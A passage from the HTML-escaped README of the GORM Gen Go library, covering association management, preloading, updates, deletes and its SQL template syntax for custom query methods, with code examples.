Address{Address1: &#34;Billing Address - Address 1&#34;},&#xA;  ShippingAddress: Address{Address1: &#34;Shipping Address - Address 1&#34;},&#xA;  Emails:          []Email{&#xA;    {Email: &#34;modi@example.com&#34;},&#xA;    {Email: &#34;modi-2@example.com&#34;},&#xA;  },&#xA;  Languages:       []Language{&#xA;    {Name: &#34;ZH&#34;},&#xA;    {Name: &#34;EN&#34;},&#xA;  },&#xA;}&#xA;&#xA;u := query.Use(db).User&#xA;&#xA;u.WithContext(ctx).Select(u.Name).Create(&amp;amp;user)&#xA;// INSERT INTO &#34;users&#34; (name) VALUES (&#34;jinzhu&#34;, 1, 2);&#xA;&#xA;u.WithContext(ctx).Omit(u.BillingAddress.Field()).Create(&amp;amp;user)&#xA;// Skip create BillingAddress when creating a user&#xA;&#xA;u.WithContext(ctx).Omit(u.BillingAddress.Field(&#34;Address1&#34;)).Create(&amp;amp;user)&#xA;// Skip create BillingAddress.Address1 when creating a user&#xA;&#xA;u.WithContext(ctx).Omit(field.AssociationFields).Create(&amp;amp;user)&#xA;// Skip all associations when creating a user&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Method &lt;code&gt;Field&lt;/code&gt; will join a serious field name with &#39;&#39;.&#34;, for example: &lt;code&gt;u.BillingAddress.Field(&#34;Address1&#34;, &#34;Street&#34;)&lt;/code&gt; equals to &lt;code&gt;BillingAddress.Address1.Street&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h6&gt;Find Associations&lt;/h6&gt; &#xA;&lt;p&gt;Find matched associations&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;languages, err = u.Languages.Model(&amp;amp;user).Find()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Find associations with conditions&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;q := query.Use(db)&#xA;u := q.User&#xA;&#xA;languages, err = u.Languages.Where(q.Language.Name.In([]string{&#34;ZH&#34;,&#34;EN&#34;})).Model(&amp;amp;user).Find()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Append Associations&lt;/h6&gt; &#xA;&lt;p&gt;Append new associations for &lt;code&gt;many to many&lt;/code&gt;, &lt;code&gt;has many&lt;/code&gt;, replace current association for &lt;code&gt;has one&lt;/code&gt;, &lt;code&gt;belongs to&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;u.Languages.Model(&amp;amp;user).Append(&amp;amp;languageZH, &amp;amp;languageEN)&#xA;&#xA;u.Languages.Model(&amp;amp;user).Append(&amp;amp;Language{Name: &#34;DE&#34;})&#xA;&#xA;u.CreditCards.Model(&amp;amp;user).Append(&amp;amp;CreditCard{Number: &#34;411111111111&#34;})&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Replace Associations&lt;/h6&gt; &#xA;&lt;p&gt;Replace current associations with new ones&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u.Languages.Model(&amp;amp;user).Replace(&amp;amp;languageZH, &amp;amp;languageEN)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Delete Associations&lt;/h6&gt; &#xA;&lt;p&gt;Remove the relationship between source &amp;amp; arguments if exists, only delete the reference, won’t delete those objects from DB.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;u.Languages.Model(&amp;amp;user).Delete(&amp;amp;languageZH, &amp;amp;languageEN)&#xA;&#xA;u.Languages.Model(&amp;amp;user).Delete([]*Language{&amp;amp;languageZH, &amp;amp;languageEN}...)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Clear Associations&lt;/h6&gt; &#xA;&lt;p&gt;Remove all reference between source &amp;amp; association, won’t delete those associations&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u.Languages.Model(&amp;amp;user).Clear()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Count Associations&lt;/h6&gt; &#xA;&lt;p&gt;Return the count of current associations&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u.Languages.Model(&amp;amp;user).Count()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Delete with Select&lt;/h6&gt; &#xA;&lt;p&gt;You are allowed to delete selected has one/has many/many2many relations with &lt;code&gt;Select&lt;/code&gt; when deleting records, for example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;// delete user&#39;s account when deleting user&#xA;u.Select(u.Account).Delete(&amp;amp;user)&#xA;&#xA;// delete user&#39;s Orders, CreditCards relations when deleting user&#xA;db.Select(u.Orders.Field(), u.CreditCards.Field()).Delete(&amp;amp;user)&#xA;&#xA;// delete user&#39;s has one/many/many2many relations when deleting user&#xA;db.Select(field.AssociationsFields).Delete(&amp;amp;user)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Preloading&lt;/h5&gt; &#xA;&lt;p&gt;This feature only support exist model for now.&lt;/p&gt; &#xA;&lt;h6&gt;Preload&lt;/h6&gt; &#xA;&lt;p&gt;GEN allows eager loading relations in other SQL with &lt;code&gt;Preload&lt;/code&gt;, for example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type User struct {&#xA;  gorm.Model&#xA;  Username string&#xA;  Orders   []Order&#xA;}&#xA;&#xA;type Order struct {&#xA;  gorm.Model&#xA;  UserID uint&#xA;  Price  float64&#xA;}&#xA;&#xA;q := query.Use(db)&#xA;u := q.User&#xA;o := q.Order&#xA;&#xA;// Preload Orders when find users&#xA;users, err := u.WithContext(ctx).Preload(u.Orders).Find()&#xA;// SELECT * FROM users;&#xA;// SELECT * FROM orders WHERE user_id IN (1,2,3,4);&#xA;&#xA;users, err := u.WithContext(ctx).Preload(u.Orders).Preload(u.Profile).Preload(u.Role).Find()&#xA;// SELECT * FROM users;&#xA;// SELECT * FROM orders WHERE user_id IN (1,2,3,4); // has many&#xA;// SELECT * FROM profiles WHERE user_id IN (1,2,3,4); // has one&#xA;// SELECT * FROM roles WHERE id IN (4,5,6); // belongs to&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Preload All&lt;/h6&gt; &#xA;&lt;p&gt;&lt;code&gt;clause.Associations&lt;/code&gt; can work with &lt;code&gt;Preload&lt;/code&gt; similar like &lt;code&gt;Select&lt;/code&gt; when creating/updating, you can use it to &lt;code&gt;Preload&lt;/code&gt; all associations, for example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type User struct {&#xA;  gorm.Model&#xA;  Name       string&#xA;  CompanyID  uint&#xA;  Company    Company&#xA;  Role       Role&#xA;  Orders     []Order&#xA;}&#xA;&#xA;users, err := u.WithContext(ctx).Preload(field.Associations).Find()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;clause.Associations&lt;/code&gt; won’t preload nested associations, but you can use it with &lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#nested-preloading&#34;&gt;Nested Preloading&lt;/a&gt; together, e.g:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;users, err := u.WithContext(ctx).Preload(u.Orders.OrderItems.Product).Find()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Preload with select&lt;/h6&gt; &#xA;&lt;p&gt;Specify selected columns with method &lt;code&gt;Select&lt;/code&gt;. Foregin key must be selected.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type User struct {&#xA;  gorm.Model&#xA;  CreditCards []CreditCard `gorm:&#34;foreignKey:UserRefer&#34;`&#xA;}&#xA;&#xA;type CreditCard struct {&#xA;  gorm.Model&#xA;  Number    string&#xA;  UserRefer uint&#xA;}&#xA;&#xA;u := q.User&#xA;cc := q.CreditCard&#xA;&#xA;// !!! Foregin key &#34;cc.UserRefer&#34; must be selected&#xA;users, err := u.WithContext(ctx).Where(c.ID.Eq(1)).Preload(u.CreditCards.Select(cc.Number, cc.UserRefer)).Find()&#xA;// SELECT * FROM `credit_cards` WHERE `credit_cards`.`customer_refer` = 1 AND `credit_cards`.`deleted_at` IS NULL&#xA;// SELECT * FROM `customers` WHERE `customers`.`id` = 1 AND `customers`.`deleted_at` IS NULL LIMIT 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Preload with conditions&lt;/h6&gt; &#xA;&lt;p&gt;GEN allows Preload associations with conditions, it works similar to Inline Conditions.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;q := query.Use(db)&#xA;u := q.User&#xA;o := q.Order&#xA;&#xA;// Preload Orders with conditions&#xA;users, err := u.WithContext(ctx).Preload(u.Orders.On(o.State.NotIn(&#34;cancelled&#34;)).Find()&#xA;// SELECT * FROM users;&#xA;// SELECT * FROM orders WHERE user_id IN (1,2,3,4) AND state NOT IN (&#39;cancelled&#39;);&#xA;&#xA;users, err := u.WithContext(ctx).Where(u.State.Eq(&#34;active&#34;)).Preload(u.Orders.On(o.State.NotIn(&#34;cancelled&#34;)).Find()&#xA;// SELECT * FROM users WHERE state = &#39;active&#39;;&#xA;// SELECT * FROM orders WHERE user_id IN (1,2) AND state NOT IN (&#39;cancelled&#39;);&#xA;&#xA;users, err := u.WithContext(ctx).Preload(u.Orders.Order(o.ID.Desc(), o.CreateTime).Find()&#xA;// SELECT * FROM users;&#xA;// SELECT * FROM orders WHERE user_id IN (1,2) Order By id DESC, create_time;&#xA;&#xA;users, err := u.WithContext(ctx).Preload(u.Orders.On(o.State.Eq(&#34;on&#34;)).Order(o.ID.Desc()).Find()&#xA;// SELECT * FROM users;&#xA;// SELECT * FROM orders WHERE user_id IN (1,2) AND state = &#34;on&#34; Order By id DESC;&#xA;&#xA;users, err := u.WithContext(ctx).Preload(u.Orders.Clauses(hints.UseIndex(&#34;idx_order_id&#34;))).Find()&#xA;// SELECT * FROM users;&#xA;// SELECT * FROM orders WHERE user_id IN (1,2) USE INDEX (`idx_order_id`);&#xA;&#xA;user, err := u.WithContext(ctx).Where(u.ID.Eq(1)).Preload(u.Orders.Offset(100).Limit(20)).Take()&#xA;// SELECT * FROM users WHERE `user_id` = 1 LIMIT 20 OFFSET 100;&#xA;// SELECT * FROM `users` WHERE `users`.`id` = 1 LIMIT 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Nested Preloading&lt;/h6&gt; &#xA;&lt;p&gt;GEN supports nested preloading, for example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;db.Preload(u.Orders.OrderItems.Product).Preload(u.CreditCard).Find(&amp;amp;users)&#xA;&#xA;// Customize Preload conditions for `Orders`&#xA;// And GEN won&#39;t preload unmatched order&#39;s OrderItems then&#xA;db.Preload(u.Orders.On(o.State.Eq(&#34;paid&#34;))).Preload(u.Orders.OrderItems).Find(&amp;amp;users)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Update&lt;/h4&gt; &#xA;&lt;h5&gt;Update single column&lt;/h5&gt; &#xA;&lt;p&gt;When updating a single column with &lt;code&gt;Update&lt;/code&gt;, it needs to have any conditions or it will raise error &lt;code&gt;ErrMissingWhereClause&lt;/code&gt;, for example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;// Update with conditions&#xA;u.WithContext(ctx).Where(u.Activate.Is(true)).Update(u.Name, &#34;hello&#34;)&#xA;// UPDATE users SET name=&#39;hello&#39;, updated_at=&#39;2013-11-17 21:34:10&#39; WHERE active=true;&#xA;&#xA;// Update with conditions&#xA;u.WithContext(ctx).Where(u.Activate.Is(true)).Update(u.Age, u.Age.Add(1))&#xA;// or&#xA;u.WithContext(ctx).Where(u.Activate.Is(true)).UpdateSimple(u.Age.Add(1))&#xA;// UPDATE users SET age=age+1, updated_at=&#39;2013-11-17 21:34:10&#39; WHERE active=true;&#xA;&#xA;u.WithContext(ctx).Where(u.Activate.Is(true)).UpdateSimple(u.Age.Zero())&#xA;// UPDATE users SET age=0, updated_at=&#39;2013-11-17 21:34:10&#39; WHERE active=true;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Updates multiple columns&lt;/h5&gt; &#xA;&lt;p&gt;&lt;code&gt;Updates&lt;/code&gt; supports update with &lt;code&gt;struct&lt;/code&gt; or &lt;code&gt;map[string]interface{}&lt;/code&gt;, when updating with &lt;code&gt;struct&lt;/code&gt; it will only update non-zero fields by default&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;// Update attributes with `map`&#xA;u.WithContext(ctx).Where(u.ID.Eq(111)).Updates(map[string]interface{}{&#34;name&#34;: &#34;hello&#34;, &#34;age&#34;: 18, &#34;active&#34;: false})&#xA;// UPDATE users SET name=&#39;hello&#39;, age=18, active=false, updated_at=&#39;2013-11-17 21:34:10&#39; WHERE id=111;&#xA;&#xA;// Update attributes with `struct`&#xA;u.WithContext(ctx).Where(u.ID.Eq(111)).Updates(model.User{Name: &#34;hello&#34;, Age: 18, Active: false})&#xA;// UPDATE users SET name=&#39;hello&#39;, age=18, active=false, updated_at=&#39;2013-11-17 21:34:10&#39; WHERE id=111;&#xA;&#xA;// Update with expression&#xA;u.WithContext(ctx).Where(u.ID.Eq(111)).UpdateSimple(u.Age.Add(1), u.Number.Add(1))&#xA;// UPDATE users SET age=age+1,number=number+1, updated_at=&#39;2013-11-17 21:34:10&#39; WHERE id=111;&#xA;&#xA;u.WithContext(ctx).Where(u.Activate.Is(true)).UpdateSimple(u.Age.Value(17), u.Number.Zero(), u.Birthday.Null())&#xA;// UPDATE users SET age=17, number=0, birthday=NULL, updated_at=&#39;2013-11-17 21:34:10&#39; WHERE active=true;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt; When update with struct, GEN will only update non-zero fields, you might want to use &lt;code&gt;map&lt;/code&gt; to update attributes or use &lt;code&gt;Select&lt;/code&gt; to specify fields to update&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h5&gt;Update selected fields&lt;/h5&gt; &#xA;&lt;p&gt;If you want to update selected fields or ignore some fields when updating, you can use &lt;code&gt;Select&lt;/code&gt;, &lt;code&gt;Omit&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;// Select with Map&#xA;// User&#39;s ID is `111`:&#xA;u.WithContext(ctx).Select(u.Name).Where(u.ID.Eq(111)).Updates(map[string]interface{}{&#34;name&#34;: &#34;hello&#34;, &#34;age&#34;: 18, &#34;active&#34;: false})&#xA;// UPDATE users SET name=&#39;hello&#39; WHERE id=111;&#xA;&#xA;u.WithContext(ctx).Omit(u.Name).Where(u.ID.Eq(111)).Updates(map[string]interface{}{&#34;name&#34;: &#34;hello&#34;, &#34;age&#34;: 18, &#34;active&#34;: false})&#xA;// UPDATE users SET age=18, active=false, updated_at=&#39;2013-11-17 21:34:10&#39; WHERE id=111;&#xA;&#xA;result, err := u.WithContext(ctx).Where(u.ID.Eq(111)).Updates(map[string]interface{}{&#34;name&#34;: &#34;hello&#34;, &#34;age&#34;: 18, &#34;active&#34;: false})&#xA;&#xA;result.RowsAffected // affect rows number&#xA;err                 // error&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Delete&lt;/h4&gt; &#xA;&lt;h5&gt;Delete record&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;e := query.Use(db).Email&#xA;&#xA;// Email&#39;s ID is `10`&#xA;e.WithContext(ctx).Where(e.ID.Eq(10)).Delete()&#xA;// DELETE from emails where id = 10;&#xA;&#xA;// Delete with additional conditions&#xA;e.WithContext(ctx).Where(e.ID.Eq(10), e.Name.Eq(&#34;modi&#34;)).Delete()&#xA;// DELETE from emails where id = 10 AND name = &#34;modi&#34;;&#xA;&#xA;result, err := e.WithContext(ctx).Where(e.ID.Eq(10), e.Name.Eq(&#34;modi&#34;)).Delete()&#xA;&#xA;result.RowsAffected // affect rows number&#xA;err                 // error&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Delete with primary key&lt;/h5&gt; &#xA;&lt;p&gt;GEN allows to delete objects using primary key(s) with inline condition, it works with numbers.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u.WithContext(ctx).Where(u.ID.In(1,2,3)).Delete()&#xA;// DELETE FROM users WHERE id IN (1,2,3);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Batch Delete&lt;/h5&gt; &#xA;&lt;p&gt;The specified value has no primary value, GEN will perform a batch delete, it will delete all matched records&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;e := query.Use(db).Email&#xA;&#xA;e.WithContext(ctx).Where(e.Name.Like(&#34;%modi%&#34;)).Delete()&#xA;// DELETE from emails where email LIKE &#34;%modi%&#34;;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Soft Delete&lt;/h5&gt; &#xA;&lt;p&gt;If your model includes a &lt;code&gt;gorm.DeletedAt&lt;/code&gt; field (which is included in &lt;code&gt;gorm.Model&lt;/code&gt;), it will get soft delete ability automatically!&lt;/p&gt; &#xA;&lt;p&gt;When calling &lt;code&gt;Delete&lt;/code&gt;, the record WON’T be removed from the database, but GORM will set the &lt;code&gt;DeletedAt&lt;/code&gt;‘s value to the current time, and the data is not findable with normal Query methods anymore.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Batch Delete&#xA;u.WithContext(ctx).Where(u.Age.Eq(20)).Delete()&#xA;// UPDATE users SET deleted_at=&#34;2013-10-29 10:23&#34; WHERE age = 20;&#xA;&#xA;// Soft deleted records will be ignored when querying&#xA;users, err := u.WithContext(ctx).Where(u.Age.Eq(20)).Find()&#xA;// SELECT * FROM users WHERE age = 20 AND deleted_at IS NULL;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you don’t want to include &lt;code&gt;gorm.Model&lt;/code&gt;, you can enable the soft delete feature like:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type User struct {&#xA;    ID      int&#xA;    Deleted gorm.DeletedAt&#xA;    Name    string&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Find soft deleted records&lt;/h5&gt; &#xA;&lt;p&gt;You can find soft deleted records with &lt;code&gt;Unscoped&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;users, err := db.WithContext(ctx).Unscoped().Where(u.Age.Eq(20)).Find()&#xA;// SELECT * FROM users WHERE age = 20;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Delete permanently&lt;/h5&gt; &#xA;&lt;p&gt;You can delete matched records permanently with &lt;code&gt;Unscoped&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;o.WithContext(ctx).Unscoped().Where(o.ID.Eq(10)).Delete()&#xA;// DELETE FROM orders WHERE id=10;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;DIY method&lt;/h3&gt; &#xA;&lt;h4&gt;Method interface&lt;/h4&gt; &#xA;&lt;p&gt;The DIY method needs to be defined through the interface. In the method, the specific SQL query logic is described in the way of comments. Simple WHERE queries can be wrapped in &lt;code&gt;where()&lt;/code&gt;. When using complex queries, you need to write complete SQL. You can directly wrap them in &lt;code&gt;sql()&lt;/code&gt; or write SQL directly. If there are some comments on the method, just add a blank line comment in the middle.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type Method interface {&#xA;    // where(&#34;name=@name and age=@age&#34;)&#xA;    SimpleFindByNameAndAge(name string, age int) (gen.T, error)&#xA;&#xA;    // FindUserToMap query by id and return id-&amp;gt;instance&#xA;    // &#xA;    // sql(select * from users where id=@id)&#xA;    FindUserToMap(id int) (gen.M, error)&#xA;    &#xA;    // InsertValue insert into users (name,age) values (@name,@age)&#xA;    InsertValue(age int, name string) error&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Method input parameters and return values support basic types (&lt;code&gt;int&lt;/code&gt;, &lt;code&gt;string&lt;/code&gt;, &lt;code&gt;bool&lt;/code&gt;...), struct and placeholders (&lt;code&gt;gen.T&lt;/code&gt;/&lt;code&gt;gen.M&lt;/code&gt;/&lt;code&gt;gen.RowsAffected&lt;/code&gt;), and types support pointers and arrays. The return value is at most a value and an error.&lt;/p&gt; &#xA;&lt;h5&gt;Syntax of template&lt;/h5&gt; &#xA;&lt;h6&gt;placeholder&lt;/h6&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;gen.T&lt;/code&gt; represents specified &lt;code&gt;struct&lt;/code&gt; or &lt;code&gt;table&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;gen.M&lt;/code&gt; represents &lt;code&gt;map[string]interface&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;gen.RowsAffected&lt;/code&gt; represents SQL executed &lt;code&gt;rowsAffected&lt;/code&gt; (type:int64)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;@@table&lt;/code&gt; represents table&#39;s name (if method&#39;s parameter doesn&#39;t contains variable &lt;code&gt;table&lt;/code&gt;, GEN will generate &lt;code&gt;table&lt;/code&gt; from model struct)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;@@&amp;lt;columnName&amp;gt;&lt;/code&gt; represents column&#39;s name or table&#39;s name&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;@&amp;lt;name&amp;gt;&lt;/code&gt; represents normal query variable&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h6&gt;template&lt;/h6&gt; &#xA;&lt;p&gt;Logical operations must be wrapped in &lt;code&gt;{{}}&lt;/code&gt;,and end must used &lt;code&gt;{{end}}&lt;/code&gt;, All templates support nesting&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;if&lt;/code&gt;/&lt;code&gt;else if&lt;/code&gt;/&lt;code&gt;else&lt;/code&gt; the condition accept a bool parameter or operation expression which conforms to Golang syntax.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;where&lt;/code&gt; The &lt;code&gt;where&lt;/code&gt; clause will be inserted only if the child elements return something. The key word &lt;code&gt;and&lt;/code&gt; or &lt;code&gt;or&lt;/code&gt; in front of clause will be removed. And &lt;code&gt;and&lt;/code&gt; will be added automatically when there is no junction keyword between query condition clause.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Set&lt;/code&gt; The &lt;code&gt;set&lt;/code&gt; clause will be inserted only if the child elements return something. The &lt;code&gt;,&lt;/code&gt; in front of columns array will be removed.And &lt;code&gt;,&lt;/code&gt; will be added automatically when there is no junction keyword between query coulmns.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;for&lt;/code&gt; The &lt;code&gt;for&lt;/code&gt; clause traverses an array according to golang syntax and inserts its contents into SQL,supports array of struct.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;...&lt;/code&gt; Coming soon&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h6&gt;&lt;code&gt;If&lt;/code&gt; clause&lt;/h6&gt; &#xA;&lt;pre&gt;&lt;code&gt;{{if cond1}}&#xA;    // do something here&#xA;{{else if cond2}}&#xA;    // do something here&#xA;{{else}}&#xA;    // do something here&#xA;{{end}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use case in raw SQL:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// select * from users where &#xA;//  {{if name !=&#34;&#34;}} &#xA;//      name=@name&#xA;//  {{end}}&#xA;methond(name string) (gen.T,error)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use case in raw SQL template:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;select * from @@table where&#xA;{{if age&amp;gt;60}}&#xA;    status=&#34;older&#34;&#xA;{{else if age&amp;gt;30}}&#xA;    status=&#34;middle-ager&#34;&#xA;{{else if age&amp;gt;18}}&#xA;    status=&#34;younger&#34;&#xA;{{else}}&#xA;    {{if sex==&#34;male&#34;}}&#xA;        status=&#34;boys&#34;&#xA;    {{else}}&#xA;        status=&#34;girls&#34;&#xA;    {{end}}&#xA;{{end}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;&lt;code&gt;Where&lt;/code&gt; clause&lt;/h6&gt; &#xA;&lt;pre&gt;&lt;code&gt;{{where}}&#xA;    // do something here&#xA;{{end}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use case in raw SQL&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// select * from &#xA;//  {{where}}&#xA;//      id=@id&#xA;//  {{end}}&#xA;methond(id int) error&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use case in raw SQL template&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;select * from @@table &#xA;{{where}}&#xA;    {{if cond}} id=@id, {{end}}&#xA;    {{if name != &#34;&#34;}} @@key=@value, {{end}}&#xA;{{end}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;&lt;code&gt;Set&lt;/code&gt; clause&lt;/h6&gt; &#xA;&lt;pre&gt;&lt;code&gt;{{set}}&#xA;    // sepecify update expression here&#xA;{{end}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use case in raw SQL&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// update users &#xA;//  {{set}}&#xA;//      name=@name&#xA;//  {{end}}&#xA;// where id=@id&#xA;methond(name string,id int) error&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use case in raw SQL template&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;update @@table &#xA;{{set}}&#xA;    {{if name!=&#34;&#34;}} name=@name {{end}}&#xA;    {{if age&amp;gt;0}} age=@age {{end}}&#xA;{{end}}&#xA;where id=@id&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;&lt;code&gt;For&lt;/code&gt; clause&lt;/h6&gt; &#xA;&lt;pre&gt;&lt;code&gt;{{for _,name:=range names}}&#xA;    // do something here&#xA;{{end}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use case in raw SQL:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// select * from users where id&amp;gt;0 &#xA;//  {{for _,name:=range names}} &#xA;//      and name=@name&#xA;//  {{end}}&#xA;methond(names []string) (gen.T,error) &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use case in raw SQL template:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;select * from @@table where&#xA;  {{for index,name:=range names}}&#xA;     {{if index &amp;gt;0}} &#xA;        OR&#xA;     {{end}}&#xA;     name=@name&#xA;  {{end}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Method interface example&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type Method interface {&#xA;    // Where(&#34;name=@name and age=@age&#34;)&#xA;    SimpleFindByNameAndAge(name string, age int) (gen.T, error)&#xA;    &#xA;    // select * from users where id=@id&#xA;    FindUserToMap(id int) (gen.M, error)&#xA;    &#xA;    // sql(insert into @@table (name,age) values (@name,@age) )&#xA;    InsertValue(age int, name string) error&#xA;    &#xA;    // select name from @@table where id=@id&#xA;    FindNameByID(id int) string&#xA;    &#xA;    // select * from @@table&#xA;    //  {{where}}&#xA;    //      id&amp;gt;0&#xA;    //      {{if cond}}id=@id {{end}}&#xA;    //      {{if key!=&#34;&#34; &amp;amp;&amp;amp; value != &#34;&#34;}} or @@key=@value{{end}}&#xA;    //  {{end}}&#xA;    FindByIDOrCustom(cond bool, id int, key, value string) ([]gen.T, error)&#xA;    &#xA;    // update @@table&#xA;    //  {{set}}&#xA;    //      update_time=now()&#xA;    //      {{if name != &#34;&#34;}}&#xA;    //          name=@name&#xA;    //      {{end}}&#xA;    //  {{end}}&#xA;    //  {{where}}&#xA;    //      id=@id&#xA;    //  {{end}}&#xA;    UpdateName(name string, id int) (gen.RowsAffected,error)&#xA;&#xA;    // select * from @@table&#xA;    //  {{where}}&#xA;    //      {{for _,user:=range users}}&#xA;    //          {{if user.Age &amp;gt;18}&#xA;    //              OR name=@user.Name &#xA;    //         {{end}}&#xA;    //      {{end}}&#xA;    //  {{end}}&#xA;    FindByOrList(users []gen.T) 